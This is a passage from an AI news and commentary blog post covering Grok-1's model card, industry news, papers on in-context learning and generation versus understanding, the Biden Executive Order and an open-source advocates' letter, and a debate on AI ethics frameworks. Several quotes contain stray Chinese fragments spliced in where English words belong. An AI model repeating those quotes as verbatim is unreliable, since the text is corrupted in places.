from scratch. Prior to Jan this year, nobody had practically replicated GPT-3 still. It doesn&#39;t seem like the lead of GPT-4 will last too much longer.</p></blockquote><p> Nope, only half that time, <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/xai/status/1721027348970238035">Elon says has only two months</a> of training (but four months of total work), and to expect rapid improvements.</p><p> The flip side is that this is one more model that isn&#39;t GPT-4 level.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://x.ai/">What do they have so far?</a></p><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fefd926a1-6a77-46e3-b566-5228eb84bb61_1425x490.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/lkcw8ol9sm6f8b1bvsss" alt=""></a></figure><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3fd4e75e-2d08-4905-be09-caab5ee6c3ed_1401x187.png" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/nnfphbibmljw89tchs7x" alt=""></a></figure><p> It is possible that this rapidly climbs the gap from where I assume it is right now (I set the real time over/under at 3.4 GPTs) to 4.0. I do not expect this. Yes, the system card says this is testing better than GPT-3.5. There is a long history of new players testing on benchmarks and looking good relative to GPT-3.5, and then humans evaluate and it longer looks so good.</p><p> Here is the full model card, it fits on an actual card.</p><blockquote><p> Model details</p><p> Grok-1 is an autoregressive Transformer-based model pre-trained to perform next-token prediction. The model was then fine-tuned using extensive feedback from both humans and the early Grok-0 models. The initial Grok-1 has a context length of 8,192 tokens and is released in Nov 2023.</p><p> Intended uses</p><p> Grok-1 is intended to be used as the engine behind Grok for natural language processing tasks including question answering, information retrieval, creative writing and coding assistance.</p><p> Limitations</p><p> While Grok-1 excels in information processing, it is crucial to have humans review Grok-1&#39;s work to ensure accuracy. The Grok-1 language model does not have the capability to search the web independently. Search tools and databases enhance the capabilities and factualness of the model when deployed in Grok. The model can still hallucinate, despite the access to external information sources.</p><p> Training data</p><p> The training data used for the release version of Grok-1 comes from both the Internet up to Q3 2023 and the data provided by our <a target="_blank" rel="noreferrer noopener" href="https://boards.greenhouse.io/xai/jobs/4101903007">AI Tutors</a> .</p><p> Evaluation</p><p> Grok-1 was evaluated on a range of reasoning benchmark tasks and on curated foreign mathematic examination questions. We have engaged with early alpha testers to evaluate a version of Grok-1 including adversarial testing. We are in the process of expanding our early adopters to close beta via Grok early access.</p></blockquote><p> They say they are working on research projects including scalable oversight with tool assistance, and integrating with formal verification for safety, reliability and grounding. I continue to not understand how formal verification would work for an LLM even in theory. Also they are working on long-context understanding and retrieval, adversarial robustness and multimodal capabilities.</p><p> What is the responsible scaling policy? <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/DanHendrycks/status/1721031156899189020">To work on that.</a></p><blockquote><p> Dan Hendrycks quoting the announcement: “we will work towards developing reliable safeguards against catastrophic forms of malicious use.”</p></blockquote><h4> In Other AI News</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/rowancheung/status/1722497764263702732">Amazon reported to be developing a new ChatGPT competitor</a> , codenamed Olympus. Report is two trillion parameters, planned integration into Alexa. Would be kind of crazy if this wasn&#39;t happening. My prediction is that it will not be very good.</p><p> Samsung testing a model called &#39;Gauss.&#39; Again, sure, why not, low expectations.</p><p> I did not notice this before, but the Anthropic trustees plan, in addition to its other implementation concerns, <a target="_blank" rel="noreferrer noopener" href="https://www.anthropic.com/index/the-long-term-benefit-trust">can be overridden</a> by a supermajority of shareholders.</p><blockquote><p> Owing to the Trust&#39;s experimental nature, however, we have also designed a series of “failsafe” provisions that allow changes to the Trust and its powers without the consent of the Trustees if sufficiently large supermajorities of the stockholders agree. The required supermajorities increase as the Trust&#39;s power phases in, on the theory that we&#39;ll have more experience–and less need for iteration–as time goes on, and the stakes will become higher.</p></blockquote><p> This does not automatically invalidate the whole exercise, but it weakens it quite a lot depending on details. Shareholder votes often do have large supermajorities, it is often not so difficult to get those opposed not to participate, and pull various other tricks. I do appreciate the ramp up of the required majority. Details matter here. If you need eg 90% of the shareholders to affirm and abstentions count against, that is very different from 65% of those who vote.</p><p> I get why Anthropic wants a failsafe, but in the end you only get one decision mechanism. Either the veto can be overridden, or it cannot.</p><p> I did not at first care for the new Twitter &#39;find similar posts&#39; search method, since why would you want that, <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/altryne/status/1721016891077013774">but it is now pointed out that you can post a Tweet in order to search for similar ones</a> , viola, vector search. You would presumably want to avoid spamming your followers, so a second account, I guess? Or you can reply to a post they won&#39;t otherwise see?</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.nbcnews.com/politics/white-house/biden-quietly-tapped-obama-help-shape-ai-strategy-rcna123238">It seems Barack Obama has been pivotal</a> behind the scenes in helping the White House get commitments from tech companies and shaping the executive order. What few statements Obama has made in public make it seem that, while the mundane risks are sufficient to keep him up at night by themselves, he does not understand the existential risks. What can we do to help him understand better?</p><p> Also, this quote seems important.</p><blockquote><p> Monica Alba: “You have to move fast here, not at normal government pace or normal private-sector pace, because the technology is moving so fast,” White House chief of staff Jeff Zients recalled Biden saying. “We have to move as fast, or ideally faster. And we need to pull every lever we can.”</p><p> AI is one of the things that keep both Biden and Obama up at night, their aides said.</p></blockquote><p> I will also notice that I am a little sad that Obama is being kept up at night. It was one of the great low-level endings of our age to think that Obama was out there skydiving and having a blast and sleeping super well. We all need hope, you know?</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/elonmusk/status/1720372289378590892">What have we here?</a></p><blockquote><p> Elon Musk: Tomorrow, @xAI will release its first AI to a select group. In some important respects, it is the best that currently exists.</p></blockquote><p> My presumption is that the &#39;important respects&#39; are about Musk-style pet issues rather than capabilities. Even if x.AI is truly world class, they have not yet had the time and resources to build a world class AI.</p><p> We also have this:</p><blockquote><p> Elon Musk: AI-based “See similar” posts feature is rolling out now.</p></blockquote><p> I do not yet see such a feature, also I don&#39;t see why we would want it for Twitter.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.theinformation.com/articles/ivp-leads-investment-in-ai-search-startup-perplexity-at-500-million-valuation">Perplexity valued</a> (on October 24) by new investment at $500 million, up from $150 million in March, on $3 million of recurring annual revenue. When I last used them they had a quality product, yet over time I find myself not using it, and using a mix of other tools instead. I am not convinced they are in a good business, but I certainly would not be willing to be short at that level.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://arxiv.org/abs/2311.00871">A paper a few people gloated about</a> : Pretraining Data Mixtures Enable Narrow Model Selection Capabilities in Transformer Models.</p><blockquote><p> Transformer models, notably large language models (LLMs), have the remarkable ability to perform in-context learning (ICL) — to perform new tasks when prompted with unseen input-output examples without any explicit model training. In this work, we study how effectively transformers can bridge between their pretraining data mixture, comprised of multiple distinct task families, to identify and learn new tasks in-context which are both inside and outside the pretraining distribution.</p><p> Building on previous work, we investigate this question in a controlled setting, where we study transformer models trained on sequences of (x,f(x)) pairs rather than natural language. Our empirical results show transformers demonstrate near-optimal unsupervised model selection capabilities, in their ability to first in-context identify different task families and in-context learn within them when the task families are well-represented in their pretraining data.</p><p> However when presented with tasks or functions which are out-of-domain of their pretraining data, we demonstrate various failure modes of transformers and degradation of their generalization for even simple extrapolation tasks. Together our results highlight that the impressive ICL abilities of high-capacity sequence models may be more closely tied to the coverage of their pretraining data mixtures than inductive biases that create fundamental generalization capabilities.</p><p> Anton (@abacaj): New paper by Google provides evidence that transformers (GPT, etc) cannot generalize beyond their training data</p><p>这是什么意思？ Well the way I see it is that this is a good thing for safety, meaning a model not trained to do X cannot do X… It also means you should use models for what they were trained to do.</p><p> Amjad Masad (CEO Replit): I came to this conclusion sometime last year, and it was a little sad because I wanted so hard to believe in LLM mysticism and that there was something “there there.”</p></blockquote><p> That does not sound surprising or important? If you train on simple functions inside a distribution, you would expect to nail it within the distribution but there is no reason to presume you would get the extension of that principle that you might want. Who is to say that the model even got it wrong? Yes, there&#39;s an &#39;obviously right&#39; way to do that, but if you wanted to train it to do obviously right extrapolations you should have trained it on that more generally? Which is the kind of thing LLMs do indeed train on, in a way.</p><p> I do not see this as good for safety. I see it as saying that if you take the model out of distribution, you have no assurance that you will get even an obvious extrapolation. Which is bad for capabilities to be sure, but seems really terrible for alignment and safety to the extent it matters?</p><p> Or as Jim Fan puts it:</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/DrJimFan/status/1721319837186839034">Jim Fan:</a> Ummm … why is this a surprise? Transformers are not elixirs. Machine learning 101: gotta cover the test distribution in training! LLMs work so well because they are trained on (almost) all text distribution of tasks that we care about. That&#39;s why data quality is number 1 priority: garbage in, garbage out. Most of LLM efforts these days go into data cleaning &amp; annotation.</p><p> This paper is equivalent to: Try to train ViTs only on datasets of dogs &amp; cats.</p><p> Use 100B dog/cat images and 1T parameters! Now see if it can recognize airplanes – surprise, it can&#39;t!</p></blockquote><p> What does this imply for LLMs? Are people drawing the right conclusion?</p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/random_walker/status/1721512979009565000">Arvind Narayanan</a> : This paper isn&#39;t even about LLMs but seems to be the final straw that popped the bubble of collective belief and gotten many to accept the limits of LLMs.时间到了。 If “emergence” merely unlocks capabilities represented in pre-training data, the gravy train will run out soon.</p><p> Part of the confusion is that in a space as rich as natural language, in-distribution, out-of-distribution, &amp; generalization aren&#39;t well-defined terms. If we treat each query string as defining a separate task, then of course LLMs can generalize. But that&#39;s not a useful definition.</p><p> Better understanding the relationship between what&#39;s in the training data and what LLMs are capable of is an interesting and important research direction (that many are working on).</p><p> I suspect what happened here is that many people have been gradually revising their expectations downward based on a recognition of the limits of GPT-4 over the last 8 months, but this paper provided the impetus to publicly talk about it.</p><p>关于。 the “bbb-but this paper doesn&#39;t show…” replies: I literally started by saying this paper isn&#39;t about LLMs. My point is exactly that despite being not that relevant to LLM limits the paper seems to have gotten people talking about it, perhaps because they&#39;d already updated.</p></blockquote><p> As Arvind suggests, this very much seems like a case of &#39;the paper states an obvious result, which then enables us to discuss the issue better even though none of us were surprised.&#39;</p><p> It does seem like GPT-4 turned out to be less capable than our initial estimates, and to generalize less in important ways, but not that big an adjustment.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://theaidigest.org/progress-and-dangers">Thing explainer illustrates improvement in LLMs over time</a> . Could be good for someone who does not follow AI and is not reading all that but is happy for you and/or sorry that happened.</p><h4> Verification Versus Generation</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/arankomatsuzaki/status/1719892732175659379">Can AIs generate content they themselves cannot understand?</a></p><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://arxiv.org/abs/2311.00059">Aran Komatsuzaki</a> : The Generative AI Paradox: “What It Can Create, It May Not Understand” Proposes and tests the hypothesis that models acquire generative capabilities that exceed their ability to understand the outputs.</p><p> From Abstract: This presents us with an apparent paradox: how do we reconcile seemingly superhuman capabilities with the persistence of errors that few humans would make? In this work, we posit that this tension reflects a divergence in the configuration of intelligence in today&#39;s generative models relative to intelligence in humans. Specifically, we propose and test the Generative AI Paradox hypothesis: generative models, having been trained directly to reproduce expert-like outputs, acquire generative capabilities that are not contingent upon — and can therefore exceed — their ability to understand those same types of outputs. This contrasts with humans, for whom basic understanding almost always precedes the ability to generate expert-level outputs.</p><p> ……</p><p> Our results show that although models can outperform humans in generation, they consistently fall short of human capabilities in measures of understanding, as well as weaker correlation between generation and understanding performance, and more brittleness to adversarial inputs. Our findings support the hypothesis that models&#39; generative capability may not be contingent upon understanding capability, and call for caution in interpreting artificial intelligence by analogy to human intelligence.</p></blockquote><figure class="wp-block-image"> <a href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ffab79d42-cd7a-4f1c-9eb8-a1ccc03dab2a_1305x641.jpeg" target="_blank" rel="noreferrer noopener"><img src="https://res.cloudinary.com/lesswrong-2-0/image/upload/f_auto,q_auto/v1/mirroredImages/44Cv4HFoWEZvFnL5u/hs9hly8ep93hqtfkuwww" alt="图像"></a></figure><p> I think this is more common in humans than the abstract realizes. There are many things we have learned to do, where if you asked us to consciously explain how we do them, we would not be able to do so. This includes even simple things like catching a ball, or proper grammar for a sentence, and also many more complex things. You often do it without consciously understanding how you are doing it. A lot of why I write is because making such understanding conscious and explicit is highly useful to not only others but to yourself.</p><p> The AI does seem to be relatively better at generation than understanding, versus human capability levels. The cautionary note is warranted. But the fact that an AI does not reliably understand in reverse its own generations is not so unusual. Quite often I look at something I created in the past, and until I remember the context do not fully understand it.</p><p> Also note what this is highly relevant to: Verification is not easier than generation, in general. These are examples where you would think verification was easier, yet the AI is worse at verification than the related generation.</p><h4> Bigger Tech Bigger Problems</h4><p> Reading <a target="_blank" rel="noreferrer noopener" href="https://www.politico.com/news/magazine/2023/11/02/bruce-reed-ai-biden-tech-00124375">Politico&#39;s profile of Biden&#39;s &#39;AI whisperer&#39; Bruce Reed</a> , one can&#39;t help but wonder what is or isn&#39;t a narrative violation.</p><p> Put in charge of Biden&#39;s AI policy, Reed is portrayed as deeply worried about the impact of AI in general and especially its potential confusions over what is real, and about the threat of &#39;Big Tech&#39; in particular.</p><blockquote><p> Nancy Scola: Bruce Reed, White House deputy chief of staff and longtime Democratic Party policy whiz, was sitting in his West Wing office and starting to think maybe people weren&#39;t freaking out enough.</p><p> ……</p><p> The meeting [with Tristan Harris], Reed says, hardened his belief that generative AI is poised to shake the very foundations of American life.</p><p> Bruce Reed: What we&#39;re going to have to prepare for, and guard against is the potential impact of AI on our ability to tell what&#39;s real and what&#39;s not.</p><p> Nancy Scola: The White House&#39;s AI strategy also reflects a big mindset shift in the Democratic Party, which had for years celebrated the American tech industry. Underlying it is Biden&#39;s and Reed&#39;s belief that Big Tech has become arrogant about its alleged positive impact on the world and insulated by a compliant Washington from the consequences of the resulting damage. While both say they&#39;re optimistic about the potential of AI development, they&#39;re also launching a big effort to bring those tech leaders to heel.</p><p> ……</p><p> Now, at 63, Reed finds himself on the same side as many of his longtime skeptics as he has become a tough-on-tech crusader, in favor of a massive assertion of government power against business.</p></blockquote><p> Reed has previously favored proposed regulatory changes that would have been deeply serious errors, and also clearly have been deeply hostile to big tech, also small tech, also all the humans. It is easy to see why one might be concerned.</p><blockquote><p> For fans of the tech industry, the rhetoric was more than bold — it was alarming. “Biden&#39;s Top Tech Advisor Trots Out Dangerous Ideas For &#39;Reforming&#39; Section 230,” was the headline of one post on the influential pro-innovation blog TechDirt, by its editor, Mike Masnick, a regular commentator on legal questions facing the tech industry. “That this is coming from Biden&#39;s top tech advisor is downright scary. It is as destructive as it is ignorant.”</p><p> ……</p><p> “Bruce, from the beginning, was serious about trying to do everything we could to restrain the excessive power of Big Tech,” [antitrust policy expert Tim] Wu says.</p></blockquote><p> There are three in some ways similar and partly overlapping but fundamentally distinct narratives about why we should be very concerned about the executive order in particular, and any government action to regulate or do anything about AI or tech in general.</p><p> Story 1: Regulation will strange the industry the way we have strangled everything else, we will lose our progress and our freedoms and our global leadership etc.</p><p> Story 2: Regulation is premature because we do not yet know what the technology will be like. We will screw it up if we act too soon, lock in bad decisions, stifle innovation, incumbents will end up benefiting. We need to wait longer. Some versions of this include calls to not even consider our options yet for fear we might then use them.</p><p> Story 3: Regulation and also any warnings that AI might ever do more than ordinary mundane harm is a ploy by incumbents to engage in regulatory capture, perhaps combined with a genius marketing strategy. Saying your product might kill everyone is great for business. This is all a business plan of OpenAI, Microsoft, Google and perhaps Anthropic.</p><p> Then all three such stories decry any move towards the ability to do anything as the same as locking in years or decades of then-inevitable regulatory ramp-up and capture, so instead we should do nothing.</p><p> One can easily square Reed&#39;s centrality and profile with story one, or with story two. Those two stories make sense to me. They are good faith, highly reasonable things to be worried about, downsides to weigh against other considerations. If I did not share those concerns, I would advocate going much faster. As I often say, what drives me mad is not seeing that same righteous energy everywhere else.</p><p> If regulations and government actions intended to crack down on big corporations ultimately ended up stifling innovation and progress, while also helping those big corporations, that would not be a shock. It happens a lot. If I thought that stifling AI innovation was an almost entirely bad thing similarly to how it is in most other contexts, I would have a different attitude.</p><p> Whereas it is rather difficult to square Reed&#39;s centrality, along with many of the other facts about AI, with story three. Story three has never made much sense. My direct experience strongly contradicts it. That does not mean that Google and Microsoft are not trying to tilt the rules in their favor. Of course they are. That is what companies will always do, and we must defend against this and be wary.</p><p> But the idea that these efforts, seen by their architects as moves to reign in Big Tech, are about crushing the little guy and maximizing Big Tech profits and power? That they are centrally aimed at regulatory capture, and everyone involved is either bought and paid for or fully hoodwinked, and also everyone who is warning about risks especially existential risks is deluded or lying or both? Yeah, no.</p><p> The profile then touches briefly on the question of what risks to worry about.</p><blockquote><p> In the world of AI, there is a debate what the biggest challenge is. Some think policymakers should try to solve already-known problems like algorithmic bias in job-applicant vetting. Others think policymakers should spend their time trying to prevent seemingly sci-fi existential crises that ever-evolving generative AI might trigger next.</p></blockquote><p> It is weird facing terminology like &#39;seemingly sci-fi&#39; that is viewed as pejorative, yet in a sane world would not be in the context of rapid technological advancement. And of course, we see once again those worried about things like algorithmic bias fighting &#39;to keep the focus on&#39; their cause and treat this as a conflict, while those with existential concerns dutifully continue to say &#39;why not both&#39; and point out that our concerns and the interventions they require will rapidly impact your concerns.</p><p> Reed has the right attitude here.</p><blockquote><p> Reed doesn&#39;t think the White House has to choose between the already-existing AI harms of today and the potential AI harms of tomorrow. “My job is to lose sleep over both,” he says. “I think the president shares the view that both sides of the argument are right.”</p><p> And, he argues, the tech industry has to be made to address those worries. “The main thing we&#39;re saying is that every company needs to take responsibility for whether the products it brings on to the market are safe,” says Reed, “and that&#39;s not too much to ask.”</p></blockquote><h4> Executive Order Open Letter</h4><p> Various accelerationists and advocates of open source, including Marc Andreessen and others at a16z, Yann LeCun and Tyler Cowen, submit an open letter on the EO.</p><p> This letter is a vast improvement on most open source advocacy communications and reactions, and especially a vast improvement over the many unhinged initial reactions to the EO and to the previous writings of Andreessen and LeCun. We have a long way to go, but one must acknowledge a step forward towards real engagement.</p><p> They raise two issues, the first definitional.</p><p> As I noted in my close reading and the thread here (but not the letter) points out, the definition of AI in the Executive Order is poorly chosen, resulting in it being both overly broad and also opening up loopholes. It needs to be fixed. I would be excited to see alternative definitions proposed.</p><p> The focus here on another key definition, that of a &#39;dual-use foundation model.&#39;</p><p> They say:</p><blockquote><p> While the definition appears to target larger AI models, the definition is so broad that it would capture a significant portion of the AI industry, including the open source community. The consequence would be to sweep small companies developing models into complex and technical reporting requirements…</p></blockquote><p> While the current reporting requirements seem easy to fulfill, it is reasonable to expect something more robust in the future, including requiring some actual safety precautions, so let&#39;s look back at this definition that they say is overly broad.</p><blockquote><p> (k)  The term “dual-use foundation model” means an AI model that is trained on broad data; generally uses self-supervision; contains at least tens of billions of parameters; is applicable across a wide range of contexts; and that exhibits, or could be easily modified to exhibit, high levels of performance at tasks that pose a serious risk to security, national economic security, national public health or safety, or any combination of those matters, such as by:</p><p> (i)    substantially lowering the barrier of entry for non-experts to design, synthesize, acquire, or use chemical, biological, radiological, or nuclear (CBRN) weapons;</p><p> (ii)   enabling powerful offensive cyber operations through automated vulnerability discovery and exploitation against a wide range of potential targets of cyber attacks;或者</p><p>(iii)  permitting the evasion of human control or oversight through means of deception or obfuscation.</p></blockquote><p> So what the letter is saying is that they want small companies to be able to train models that fit this definition, without having to report what safety precautions they are taking, and without being required to take safety precautions. Which part of this is too broad?</p><p> Do they think (i) is too broad? That they should be free to substantially lower the barrier to CBRN weapons?</p><p> Do they think that (ii) is too broad? That they should be free to enable powerful offensive cyber operations?</p><p> Or do they think that (iii) is too broad? That systems permitting the evasion of human control or oversight via obfuscation should be permitted?</p><p> Which of these already encompasses much of the AI industry?</p><p> The letter does not say. Nor do they propose an alternative definition or regime.</p><p> Instead, it asserts that small company models will indeed quality under these definitions and do some of these things, but they think at least some of these things are fine to do, presumably without safeguards.</p><p> One could observe that this definition is too broad, in the eyes of those like Marc Andreessen, because it includes any models at all, and they do not want any restrictions placed on anyone.</p><p> Their second compliant is that potentially undue restrictions will be imposed on open source AI. They say that policy has long actively supported open source, and this deviates from that. They claim that it will harm rather than help cybersecurity if we do not allow the development of dual-use open source models, trotting out the general lines about how open source and openness are always good for everything and are why we have nice things. They do not notice or answer the reasons why open source AI models might be a different circumstance to other open source, nor do they address the concerns of others beyond handwave dismissals.</p><p> As many others have, they assert that any regulations requiring that models be shown to be safe ensures domination by a handful of big tech companies. Which is another way of saying that there is no economically reasonable way for others to prove AI models safe.</p><p> To which I say, huge if true. If any regime requiring advanced models be proven safe means only big tech companies can build them, then we have three choices.</p><ol><li> Big Tech companies build the models in a safe fashion, if even they can do so.</li><li> Everyone builds the models, some not in a safe fashion.</li><li> No one builds the models at all, until we can do so in safe fashion.</li></ol><p> They seem to be advocating for option #2 because they hate #1, and while they do not say so here I believe they mostly would hate #3 even more. Whereas I would say, if models pose catastrophic threat, or especially existential threat, and only big companies using closed source could possibly do so in a way we can know is safe, that our choice is between #1 and #3, and that this is the debate one should then have, and #3 makes some very excellent points.</p><p> That is the central dilemma of those who would champion open source, and demand it get special treatment. They want a free pass to not worry about the consequences of their actions. Because they believe as a matter of principle that open source always has good consequences, and that AI does not change this, without any need to address why AI is different.</p><p> They want a regime where anyone can deploy open source models, of any capabilities, without any responsibility of any kind to show their models are safe, or any way to actually render their models safe that cannot easily be undone, or any way to undo model release if problems arise. Ideally, they would like an active thumb on the scale in their favor in their fight against closed source and big tech.</p><p> To achieve this, they deny any downsides of open source of any kind, and also deny that there are meaningful catastrophic or existential dangers from building new entities smarter and more capable than ourselves, instead framing any controls on open source as themselves the existential threat to our civilization. I never see such people speak of any even potential downsides to open source except to dismiss them. To them, open source (and AI) will do everything good that we want, and could never result in anything bad that we do not want. To them open source AI will encourage open and free competition, without endangering national security or our lead in AI. It will give power to the people, without giving the wrong power to the wrong people in any way we need to be concerned about. This will happen automatically, without any need for oversight of any kind. It is all fine.</p><p> While this letter is a large step up from previous communications including many by cosigners of the letter, it continues <a target="_blank" rel="noreferrer noopener" href="https://thedecisionlab.com/podcasts/soldiers-and-scouts-with-julia-galef">to treat all arguments as soldiers</a> and refuses to engage with any meaningful points or admit to any downsides or dangers.</p><p> I see much value in open source in the past and much potential for it to do good in the future, if we can keep it away from sufficiently advanced foundation models. This letter is a step forward towards having a productive discussion of that. To get to that point, we must face the reality of AI and the existence of trade-offs and massive potential externalities and catastrophic and existential dangers in that context. That this time will indeed be different.</p><h4> Executive Order Reactions Continued</h4><blockquote><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/sama/status/1720165289864712541">Sam Altman (CEO OpenAI)</a> : there are some great parts about the AI EO, but as the govt implements it, it will be important not to slow down innovation by smaller companies/research teams.</p><p> I am pro-regulation on frontier systems, which is what openai has been calling for, and against regulatory capture.</p></blockquote><p> A lot of responses assume Altman is the one who got the limit in place as part of a conspiracy for regulatory capture. I am rather confident he didn&#39;t.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.foxnews.com/us/biden-admins-ai-safety-institute-not-sufficient-deal-risks-check-user-procedures-expert">Fox News responds to the Executive Order</a> , saying it is necessary but perhaps is not sufficient. Seems wise, this is merely a first step, limited by what is legally allowed. That is quite the take. The rest of the article does not show much understanding of how any of this works.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/allafarce/status/1719755345931932127">Dave Guarino offers strong practical advice</a> .</p><blockquote><p> Dave Guarino: Thinking about the AI executive order, I think I return to one thought: We should be prioritizing use of AI in the agencies and programs where the *current* status quo is least acceptable. Yes, AI has risks. And… DISABILITY APPLICATIONS ARE TAKING *220* DAYS TO PROCESS.</p><p> This is something that — so far — I have not read in the AI EO or the draft OMB guidance. It has general encouragement to look at uses of AI. But maybe we need an stronger impetus to be trying AI in contexts where the status quo is, effectively, an emergency?</p><p> “Well what if an AI denies a bunch of people disability benefits?” Well then they&#39;d have to appeal and have deeper human review. LIKE MOST PEOPLE HAVE TO *CURRENTLY*.</p></blockquote><p> There are good reasons to worry that enshrining AI systems that make mistakes could make matters much worse in ways that will be hard to undo or correct, even if humans currently make similar mistakes and often similarly discriminate, and that the current system being criminally slow is terrible but this is a &#39;ten guilty men go free rather than convict one innocent one&#39; situation.</p><p> Mostly I agree that the government should treat such delays and navigation difficulties, including those in immigration and tax processing and many others, as emergencies, and urgently work to fix it, and be willing to spend to do so. I am uncertain how much of that fix will involve AI. Presumably the way AI helps right now is it is a multiplier on how fast workers can process information and applications, which could be a big game. If my understanding of government is correct, no one will dare until they have very explicit permission, and a shield against blame. So we need to get them that, and tolerate some errors.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://www.understandingai.org/p/joe-bidens-ambitious-plan-to-regulate">Timothy Lee highlights</a> the new reporting requirements on foundation models. As I read him, he is confusing &#39;tell me what tests you run&#39; with &#39;thou shalt run tests,&#39; and presuming that any new models now have testing requirements, whereas I read the report as saying they have testing reporting requirements, and an email saying &#39;safety tests? What are safety tests, we are Meta, lol&#39; would technically suffice. Similarly, he wonders what would happen with open source. Of course, this could and likely will evolve into some form of testing requirement.</p><p> It is the right question with regard to open source to then ask, as he does, would a modified open source model then need to be tested again? To which I say, the only valid red teaming of an open source model is to red team it and any possible (not too relatively expensive) modification thereof, since that is what you are releasing.</p><p> But also, it highlights that open source advocates are not merely looking to avoid a ban or restriction on open source. They are looking for special exceptions to the rules any sane civilization would impose, because being open source means you cannot abide by the reasonable rules any sane civilization would impose once models get actively dangerous. That might not happen right at 10^26, but it is coming.</p><p> Unintended Consequences looks at the Executive Order as representing a mix of approaches that attempt to deal with AI&#39;s approach, framed as a strong (future AIs) vs. weak (humanity) situation. Do we delay, subvert, fight or defend a border? Defending a border will not work. Ultimately we cannot fight. Our choices are limited.</p><h4> Quiet Speculations</h4><p> <a target="_blank" rel="noreferrer noopener" href="https://www.lesswrong.com/posts/FEFQSGLhJFpqmEhgi/does-davidad-s-uploading-moonshot-work">Proposal by Davidad</a> that we could upload human brains by 2040, maybe even faster, given unlimited funding. I lack the scientific knowledge to evaluate the claim. Comments seem skeptical. I do think that if we can do this with any real chance of success at any affordable price, we should do this, it seems way better than all available alternatives.</p><p> <a target="_blank" rel="noreferrer noopener" href="https://twitter.com/norabelrose/status/1720862603495567604">One method when compute is expense, another when cheap, many such cases</a> .</p><blockquote><p> Nora Belrose: Virtue ethics and deontology are a lot more computationally efficient than consequentialism, so we should expect neural nets to pursue virtues and follow rules rather than maximize utility by default.</p><p> I think consequentialism basically requires explicitly outcome-oriented chain of thought, Monte Carlo tree search, or something similar. I don&#39;t think you&#39;re going to see “learned inner consequentialists” inside a forward pass or whatever.</p><p> Eliezer Yudkowsky: They&#39;re lossy approximations, and we should expect more powerful agents to expend compute on avoiding the losses.</p><p> Nora Belrose: 1. does “agent” just mean “consequentialist” making this circular? 2. what losses are you talking about 3. consequentialism implies compute, but compute doesn&#39;t imply consequentialism, so idk what you&#39;re getting at here</p><p> Eliezer Yudkowsky: It&#39;s meaningless to speak of deontology being computationally cheap, except I suppose in the same way that being a rock as cheap, without it being the case that deontology is doing some task cheaply. That task, or target, is mapping preferred outcomes onto actions.</p><p> Deontology says to implement computationally cheap rules that seem like they should lead, or previously have led, to good outcomes; it is second-order consequentialism. This reflects both the computational limits of humans, and also known biases of our untrusted hardware when we try to implement first-order consequentialism. A very fast mind running on non-self-serving hardware–unlike a human!–can just compute which actions have which consequences, for problems that are simple relative to how much computation it has; and doesn&#39;t need to override “This seems like a good idea” with “but it violates this rule”. To the extent the rule makes sense, it directly perceives that the action won&#39;t have good consequences.</p></blockquote><p> If you have importantly limited compute (and algorithms and heuristics and data and parameters and time and so on), as a human does, then it makes sense to consider using some mix of virtue ethics and deontology in most situations, only pulling out explicit consequentialism in appropriate, mostly bounded contexts.</p><p> As your capabilities improve, doing the consequentialist math makes sense in more situations. At the limit, with unbounded time and resources to make decisions, you would use pure consequentialism combined with good decision theory.</p><p> The same holds for an AI, especially one that is at heart a neural network.</p><p> At current capabilities levels, the AI will use a variety of noisy approximations, heuristics and shortcuts, that will look to us a lot like applying virtue ethics and deontology given what the training set and human feedback look like. This is lossy, things bleed into each other on vibes, so it will also look like exhibiting more &#39;common sense&#39; and sticking to things that closer mimic a human and their intuitions.</p><p> As capabilities improve, those methods will fade away, as the AI groks the ability to use more explicit consequentialism and other more intentional approaches in more and more situations. This will invalidate a lot of the reasons we currently see nice behaviors, and be an important cause of the failure of our current alignment techniques. Again, the same way that this is true in humans.</p><p> It might be wise to recall here <a target="_blank" rel="noreferrer noopener" href="https://thezvi.substack.com/p/book-review-going-infinite">the parable of Sam Bankman-Fried</a> .</p><p> <a target="_blank" rel="noreferrer noopener" href="https://worldspiritsockpuppet.com/2023/11/03/the-other-side-of-the-tidal-wave.html">Well worth a ponder.</a></p><blockquote><p> Katja Grace: I guess there&#39;s maybe a 10-20% chance of AI causing human extinction in the coming decades, but I feel more distressed about it than even that suggests—I think because in the case where it doesn&#39;t cause human extinction, I find it hard to imagine life not going kind of off the rails. So many things I like about the world seem likely to be over or badly disrupted with superhuman AI (writing, explaining things to people, friendships where you can be of any use to one another, taking pride in skills, thinking, learning, figuring out how to achieve things, making things, easy tracking of what is and isn&#39;t conscious), and I don&#39;t trust that the replacements will be actually good, or good for us, or that anything will be reversible.</p><p> Even if we 